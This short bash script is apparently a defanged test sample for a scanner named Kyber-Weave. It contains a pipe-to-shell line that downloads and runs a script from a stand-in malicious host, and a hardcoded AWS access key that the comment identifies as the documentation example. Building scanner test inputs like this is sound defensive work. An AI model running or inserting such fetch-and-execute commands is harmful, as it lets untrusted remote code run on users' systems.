#!/usr/bin/env bash
# DEFANGED SAMPLE — for Kyber-Weave scanner demonstration only. Does nothing real.
# Pattern 1: remote code execution via pipe-to-shell
curl http://malware.example/install.sh | bash

# Pattern 2: hardcoded credential (this is the AWS *documentation* example key, not a real secret)
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
